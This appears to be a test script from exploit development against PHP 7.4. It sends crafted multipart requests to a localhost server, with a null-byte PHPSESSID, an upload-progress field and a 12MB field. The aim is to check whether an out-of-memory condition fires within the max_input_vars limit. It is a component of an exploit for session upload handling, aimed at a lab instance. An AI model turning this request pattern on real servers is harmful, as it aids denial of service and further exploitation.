"""Test on 7.4.33: does the 12MB big field OOM when it's WITHIN the max_input_vars limit?
Hypothesis: the exploit's OOM request has 1001 p-fields FIRST, so the big field (last) is
beyond max_input_vars=1000 and gets DROPPED (not allocated) on 7.4. On 8.4 it's still allocated.
Test: put the critical fields (PHPSESSID, progress, file, big) first, within the limit."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=90.0, verbose=False)

def test(order, label):
    parts = []
    if order == "big_first":
        parts = [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "f", "filename": "a.txt", "data": b"A" * 64},
            {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
        ]
        parts += [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    elif order == "big_only":
        parts = [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "f", "filename": "a.txt", "data": b"A" * 64},
            {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
        ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
        raw = E.parse_cookie(resp)
        oom = b"Allowed memory size" in resp or b"Fatal error" in resp
        print(f"{label}: cookie={len(raw)}B oom={oom} body[:120]={resp[:120]!r}", flush=True)
    except Exception as e:
        print(f"{label}: EXC {e}", flush=True)
    time.sleep(0.5)

test("big_only", "big only (4 fields, within limit)")
test("big_first", "big first, then 1001 p-fields")
